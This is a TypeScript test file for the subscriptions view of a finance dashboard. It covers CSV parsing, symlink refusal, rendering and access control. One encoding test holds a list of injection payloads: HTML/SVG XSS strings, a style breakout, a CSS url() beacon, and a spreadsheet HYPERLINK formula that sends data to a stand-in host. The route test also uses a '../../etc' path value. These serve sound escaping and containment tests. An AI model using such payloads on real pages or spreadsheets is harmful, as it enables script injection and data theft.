// ELOFIZETES1014: the subscriptions view of the finance tab. It reads the
// finance agent's <FINANCE_DIR>/elofizetesek/ files with the same reader rules
// as the company files (fixed names, no symlink, caps), and renders into the
// same sandboxed srcdoc iframe, so the same three risks are pinned: the caller
// gate, the files, and the output encoding. Plus the contract points Juró set:
// an empty price is "price unknown", never 0; an unverified row is marked; a
// company that is not known is its own group, not dropped.
import { describe, it, expect, vi } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, realpathSync, readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { tmpdir } from 'node:os'

const base = realpathSync(mkdtempSync(join(tmpdir(), 'marveen-subs-test-')))
const root = join(base, 'penzugy')
const subs = join(root, 'elofizetesek')
const outside = join(base, 'outside')
const projectRoot = join(base, 'project')
for (const d of [join(root, 'acme'), subs, outside, projectRoot]) mkdirSync(d, { recursive: true })

const HEADER = 'id,szolgaltato,csomag,ceg,kategoria,tipus,ciklus,dij_eredeti,deviza,ciklusdij_huf,havi_huf,havi_huf_jeloles,' +
  'arfolyam_forras,utolso_terheles,utolso_terheles_huf,kovetkezo_megujulas,megujulas_jeloles,probaido_vege,statusz,hasznalja,' +
  'forras_tipus,forras,jeloles,megjegyzes,ellenorzott\n'
// Synthetic data only.
writeFileSync(join(root, 'acme', 'meta.json'), JSON.stringify({ ceg: 'Acme Kft.' }))
writeFileSync(join(subs, 'elofizetesek.csv'), HEADER +
  'a-1,Felhő Zrt.,Pro,acme,felho_hosting,elofizetes,havi,10,EUR,4000,4000,teny,kivonat 09,2026-09-17,4000,2026-10-17,teny,,aktiv,dave,szamla+kivonat,számla X,,,igen\n' +
  'a-2,Domain Bt.,.hu,acme,domain,elofizetes,eves,12000,HUF,12000,1000,tipp (éves díj / 12),,2026-02-01,12000,2027-02-01 (TIPP),tipp,,aktiv,,billingo,számla Y,"kozelgo_megujulas,valami_uj",,nem ellenőrzött (ciklus)\n' +
  'a-3,AI Inc.,Max,nem ismert,ai,elofizetes,havi,,,,,,,,,,,,aktiv,flotta,memoria,memória 12,ellenorizendo,"Ár és fizető nem ismert, egyik kivonaton sincs.",nem ellenőrzött\n' +
  'a-4,Régi Kft.,Basic,acme,szoftver,elofizetes,havi,,HUF,,500,teny (lemondva),,2026-05-01,500,,,,megszunt,,kivonat,kivonat 05,,,igen\n' +
  'a-5,Hibás,,acme,szoftver,elofizetes,havi,,HUF,,12.5,,,,,,,,aktiv,,,,,,igen\n' +
  'a-6,Hibás2,,acme,szoftver,elofizetes,havi,,HUF,,1,,,,,,,,elo,,,,,,igen\n')
writeFileSync(join(subs, 'osszesito.csv'),
  'ceg,kategoria,elofizetes_havi_huf,ebbol_vetitett_tipp_huf,bizonytalan_havi_huf,ar_nem_ismert_db,ismetlodo_dij_havi_huf,kivonat_2026_08_huf,kivonat_2026_09_huf,valtozas_09_vs_08_huf\n' +
  'acme,felho_hosting,4000,0,0,0,0,0,4000,4000\n' +
  'acme,domain,1000,1000,0,0,0,0,0,0\n' +
  'acme,osszesen,5000,1000,0,0,9000,3000,4000,1000\n' +
  'osszes,felho_hosting,4000,0,0,0,0,0,4000,4000\n' +
  'osszes,osszesen,5000,1000,0,1,9000,3000,4000,1000\n')
writeFileSync(join(subs, 'havi_terheles.csv'),
  'ceg,honap,kategoria,terheles_huf,jeloles,forras\n' +
  'acme,2026-08,szoftver,3000,teny,kivonat\n' +
  'acme,2026-09,felho_hosting,4000,teny,kivonat\n' +
  'acme,2026-13,szoftver,1,teny,kivonat\n')
writeFileSync(join(subs, 'meta.json'), JSON.stringify({
  keszult: '2026-10-14', szemlelet: 'Bruttó Ft.', havi_osszeg_jelentese: 'aktív + új', valtozas: 'október nincs lezárva',
  figyelmeztetesek: ['Az október nincs lezárva.'], forrasok: ['OTP-kivonat'], nem_szerepel: ['lízing'], titkos_mezo: 'NEM JELENHET MEG',
}))

const envValues: Record<string, string> = { FINANCE_DIR: root, FINANCE_USERS: 'patrik' }
vi.mock('../config.js', async (importOriginal) => ({ ...(await importOriginal<typeof import('../config.js')>()), PROJECT_ROOT: projectRoot }))
vi.mock('../env.js', () => ({ readEnvFile: () => ({ ...envValues }) }))
const logged: Array<[string, unknown, string]> = []
vi.mock('../logger.js', () => {
  const l: any = {
    info: (o: unknown, m: string) => logged.push(['info', o, m]),
    warn: (o: unknown, m: string) => logged.push(['warn', o, m]),
    error: () => {}, debug: () => {},
  }
  l.child = () => l
  return { logger: l }
})

const { listCompanies, loadSubscriptions, companyNames, renderSubscriptionsPage, renderFinancePage, loadAll, readSubscriptionMeta, fmtHuf } =
  await import('../web/finance.js')
const { tryHandleFinance } = await import('../web/routes/finance.js')
type RouteContext = import('../web/routes/types.js').RouteContext

function fakeCtx(path: string, auth?: RouteContext['auth'], method = 'GET') {
  const out: { status: number; headers: Record<string, string>; body: string } = { status: 0, headers: {}, body: '' }
  const res = {
    writeHead(status: number, headers?: Record<string, string>) { out.status = status; out.headers = { ...(headers ?? {}) }; return res },
    end(chunk?: string) { if (chunk) out.body = chunk },
  }
  const url = new URL(`http://localhost:3420${path}`)
  const ctx = { req: { headers: {} } as RouteContext['req'], res, path: url.pathname, method, url, auth } as unknown as RouteContext
  return { ctx, out }
}

describe('the subscriptions folder is not a company', () => {
  it('listCompanies skips it, so the overview does not show it as a company section', () => {
    expect(listCompanies(root)).toEqual(['acme'])
    expect(renderFinancePage(loadAll(root), { lang: 'hu', theme: 'light' })).not.toContain('Az október nincs lezárva.')
  })
})

describe('loading', () => {
  const d = loadSubscriptions(root)
  const byId = new Map(d.items.rows.map((r) => [r.id, r]))
  it('an empty price is null (unknown), not 0; a "tipp" note is an estimate', () => {
    expect(byId.get('a-3')!.monthlyHuf).toBeNull()
    expect(byId.get('a-2')!.monthlyHuf).toBe(1000)
    expect(byId.get('a-2')!.monthlyEstimate).toBe(true)
    expect(byId.get('a-1')!.monthlyEstimate).toBe(false)
  })
  it('verified only on an explicit "igen"; known flags first, an unknown one kept as given', () => {
    expect(byId.get('a-1')!.verified).toBe(true)
    expect(byId.get('a-2')!.verified).toBe(false)
    expect(byId.get('a-3')!.verified).toBe(false)
    expect(byId.get('a-2')!.flags).toEqual(['kozelgo_megujulas', 'valami_uj'])
  })
  it('skips invalid rows (non-integer amount, unknown status) and says which line', () => {
    expect(byId.has('a-5')).toBe(false)
    expect(byId.has('a-6')).toBe(false)
    expect(d.items.errors.join(' ')).toMatch(/6\. sor: havi_huf/)
    expect(d.items.errors.join(' ')).toMatch(/7\. sor: statusz/)
    expect(d.charges.errors.join(' ')).toMatch(/4\. sor: honap/)
  })
  it('finds the month-named statement and change columns by pattern', () => {
    const tot = d.summary.rows.find((r) => r.company === 'acme' && r.category === 'osszesen')!
    expect(tot.statements).toEqual([{ month: '2026-08', amount: 3000 }, { month: '2026-09', amount: 4000 }])
    expect(tot.change).toBe(1000)
    expect(tot.recurring).toBe(9000)
  })
  it('meta: only the known keys', () => {
    expect(d.meta.generated).toBe('2026-10-14')
    expect(JSON.stringify(readSubscriptionMeta(readFileSync(join(subs, 'meta.json'), 'utf8')).meta)).not.toContain('NEM JELENHET MEG')
    expect(readSubscriptionMeta('[1]').errors).toEqual(['meta.json nem objektum'])
  })
  it('company names come from the companies\' own meta.json', () => {
    expect(companyNames(root).get('acme')).toBe('Acme Kft.')
  })
})

describe('containment', () => {
  it('a symlinked subscriptions folder is not followed', () => {
    const r2 = join(base, 'r2')
    mkdirSync(join(outside, 'subs'), { recursive: true })
    writeFileSync(join(outside, 'subs', 'elofizetesek.csv'), HEADER + 'x,TITOK,,acme,ai,elofizetes,havi,,,,1,,,,,,,,aktiv,,,,,,igen\n')
    mkdirSync(r2, { recursive: true })
    symlinkSync(join(outside, 'subs'), join(r2, 'elofizetesek'))
    const d = loadSubscriptions(r2)
    expect(d.present).toBe(false)
    expect(renderSubscriptionsPage(d, new Map(), { lang: 'hu', theme: 'light' })).not.toContain('TITOK')
  })
  it('a symlinked file is refused, a missing folder is "no data"', () => {
    const r3 = join(base, 'r3')
    mkdirSync(join(r3, 'elofizetesek'), { recursive: true })
    symlinkSync(join(outside, 'subs', 'elofizetesek.csv'), join(r3, 'elofizetesek', 'elofizetesek.csv'))
    const d = loadSubscriptions(r3)
    expect(d.items.rows).toEqual([])
    expect(d.items.errors[0]).toMatch(/symlink/)
    const empty = loadSubscriptions(join(base, 'project'))
    expect(empty.present).toBe(false)
    expect(renderSubscriptionsPage(empty, new Map(), { lang: 'hu', theme: 'light' })).toContain('még nincs adat')
  })
})

describe('rendering', () => {
  const html = renderSubscriptionsPage(loadSubscriptions(root), companyNames(root), { lang: 'hu', theme: 'light' })
  it('price unknown is written out, never as 0 Ft', () => {
    expect(html).toContain('ár nem ismert')
    const aiRow = html.slice(html.indexOf('AI Inc.'), html.indexOf('</tr>', html.indexOf('AI Inc.')))
    expect(aiRow).not.toMatch(/>0 Ft</)
  })
  it('on a phone the name and the monthly fee stay in view: fee second, provider column sticky', () => {
    const list = html.slice(html.indexOf('<table class="wide items">'))
    const heads = [...list.slice(0, list.indexOf('</thead>')).matchAll(/<th[^>]*>([^<]*)<\/th>/g)].map((m) => m[1])
    expect(heads.slice(0, 3)).toEqual(['Szolgáltató', 'Havi díj', 'Kategória'])
    expect(html).toContain('.items td:first-child,.items thead th:first-child{position:sticky;left:0;')
    expect(html).toContain('--stick:#faf9f5')
  })
  it('marks unverified rows, estimates, loud flags; an unknown company is its own group', () => {
    expect(html).toContain('<span class="badge b-unv">nem ellenőrzött</span>')
    expect(html).toContain('<span class="badge b-loud">közelgő megújulás</span>')
    expect(html).toContain('<span class="badge b-flag">valami_uj</span>')
    // hu-HU leaves a four-digit number ungrouped ("1000"), so compare against the formatter itself.
    expect(html).toContain(`class="num est">~${fmtHuf(1000)}`)
    expect(html).toContain('nem ismert (Cég nem ismert)')
    expect(html).toContain('Acme Kft.')
  })
  it('shows the warning, the basis, the totals, the recurring fee separately, and the ended item last', () => {
    expect(html).toContain('Az október nincs lezárva.')
    expect(html).toContain('Bruttó Ft.')
    expect(html).toContain('Ismétlődő díj (nem előfizetés)')
    expect(html).toContain('Kivonat 2026-09')
    const acme = html.slice(html.indexOf('<tr class="prod"><th colspan="9"><span class="stick">Acme Kft.'))
    expect(acme.indexOf('Régi Kft.')).toBeGreaterThan(acme.indexOf('Felhő Zrt.'))
    expect(acme.indexOf('Régi Kft.')).toBeGreaterThan(acme.indexOf('Domain Bt.'))
  })
  it('English labels exist for the same page', () => {
    const en = renderSubscriptionsPage(loadSubscriptions(root), companyNames(root), { lang: 'en', theme: 'dark' })
    expect(en).toContain('price unknown')
    expect(en).toContain('Monthly subscriptions per company')
  })
})

describe('rendering: output encoding (F3)', () => {
  const HOSTILE = [
    '<img src=//x.example/?leak>',
    '"><svg onload=alert(1)>',
    '</style><img src=x>',
    "' onmouseover='x",
    '=HYPERLINK("https://x.example/?"&A1,"y")',
    'a{background:url(//x.example/p)}',
  ]
  const evil = join(base, 'evilroot')
  mkdirSync(join(evil, 'elofizetesek'), { recursive: true })
  mkdirSync(join(evil, 'co'), { recursive: true })
  writeFileSync(join(evil, 'co', 'meta.json'), JSON.stringify({ nev: HOSTILE[0] }))
  const q = (s: string) => `"${s.replace(/"/g, '""')}"`
  // every text field hostile; the numbers stay valid so the row is shown
  writeFileSync(join(evil, 'elofizetesek', 'elofizetesek.csv'), HEADER + HOSTILE.map((h, i) => [
    q(h), q(h), q(h), i % 2 ? 'co' : q(h), q(h), q(h), q(h), q(h), q(h), '1', i % 3 ? '' : '2', q(h),
    q(h), q(h), '3', q(h), q(h), q(h), 'aktiv', q(h), q(h), q(h), q(h), q(h), q(h)].join(',')).join('\n') + '\n')
  writeFileSync(join(evil, 'elofizetesek', 'osszesito.csv'),
    'ceg,kategoria,elofizetes_havi_huf,kivonat_2026_09_huf\n' + HOSTILE.map((h) => `${q(h)},${q(h)},1,2`).join('\n') + '\n' +
    HOSTILE.map((h) => `${q(h)},osszesen,1,2`).join('\n') + '\n')
  writeFileSync(join(evil, 'elofizetesek', 'havi_terheles.csv'),
    'ceg,honap,kategoria,terheles_huf\n' + HOSTILE.map((h) => `${q(h)},2026-09,${q(h)},5`).join('\n') + '\n')
  writeFileSync(join(evil, 'elofizetesek', 'meta.json'), JSON.stringify({
    keszult: HOSTILE[3], szemlelet: HOSTILE[1], havi_osszeg_jelentese: HOSTILE[2], valtozas: HOSTILE[5],
    forrasok: HOSTILE, nem_szerepel: HOSTILE, figyelmeztetesek: HOSTILE,
  }))
  for (const lang of ['hu', 'en'] as const) {
    const out = renderSubscriptionsPage(loadSubscriptions(evil), companyNames(evil), { lang, theme: 'light' })
    it(`${lang}: no hostile value becomes markup`, () => {
      const tags = out.match(/<[^>]*>/g) ?? []
      const names = new Set(tags.map((t) => /^<\/?([a-z0-9]+)/i.exec(t)?.[1]?.toLowerCase() ?? '?'))
      for (const n of names) {
        expect(['!doctype', 'html', 'head', 'meta', 'title', 'style', 'body', 'section', 'h2', 'h3', 'p', 'div', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
          'svg', 'line', 'rect', 'text', 'details', 'summary', 'span', 'strong', 'dl', 'dt', 'dd']).toContain(n === '?' ? '!doctype' : n)
      }
      for (const t of tags) {
        expect(t).not.toMatch(/\son\w+\s*=/i)
        expect(t).not.toMatch(/\b(src|href|xlink:href|action|formaction|background|style)\s*=/i)
        expect(t).not.toMatch(/(https?:)?\/\//i)
      }
      expect(out.match(/<\/style>/g)).toHaveLength(1)
      const css = out.slice(out.indexOf('<style>'), out.indexOf('</style>'))
      expect(css).not.toMatch(/url\(|@import/i)
    })
    it(`${lang}: the hostile text is still visible, escaped, and the rows were shown`, () => {
      expect(out).toContain('&lt;img src=//x.example/?leak&gt;')
      expect(out).toContain('&quot;&gt;&lt;svg onload=alert(1)&gt;')
      expect(out).toMatch(/<td class="num">2 Ft<\/td>/)
    })
  }
})

describe('the route', () => {
  it('?view=elofizetesek serves the subscriptions view to a listed session, and logs the view', async () => {
    logged.length = 0
    const { ctx, out } = fakeCtx('/api/finance/view?view=elofizetesek', { kind: 'session', user: 'patrik' })
    await tryHandleFinance(ctx)
    expect(out.status).toBe(200)
    expect(out.headers['Cache-Control']).toBe('private, no-store')
    expect(out.body).toContain('Havi előfizetés cégenként')
    expect(logged).toEqual([['info', { user: 'patrik', view: 'elofizetesek', companies: ['acme'] }, 'finance view served']])
  })
  it('any other view value is the overview, and only a known value reaches the log', async () => {
    logged.length = 0
    const { ctx, out } = fakeCtx('/api/finance/view?view=../../etc', { kind: 'session', user: 'patrik' })
    await tryHandleFinance(ctx)
    expect(out.status).toBe(200)
    expect(out.body).not.toContain('Havi előfizetés cégenként')
    expect(logged).toEqual([['info', { user: 'patrik', view: 'overview', companies: ['acme'] }, 'finance view served']])
  })
  it('the caller gate is the same: the fleet token and an unlisted user get 403', async () => {
    for (const auth of [{ kind: 'token' }, { kind: 'session', user: 'mallory' }]) {
      const { ctx, out } = fakeCtx('/api/finance/view?view=elofizetesek', auth as RouteContext['auth'])
      await tryHandleFinance(ctx)
      expect(out.status).toBe(403)
      expect(out.body).not.toContain('Felhő Zrt.')
    }
  })
})

describe('the dashboard side (static contract)', () => {
  const app = readFileSync(join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'web', 'app.js'), 'utf8')
  it('only the known view values reach the URL (HAVIZARAS1016 added zaras)', () => {
    expect(app).toContain("financeView = v === 'elofizetesek' || v === 'zaras' ? v : 'overview'")
    expect(app).toContain('&view=${financeView}')
  })
})
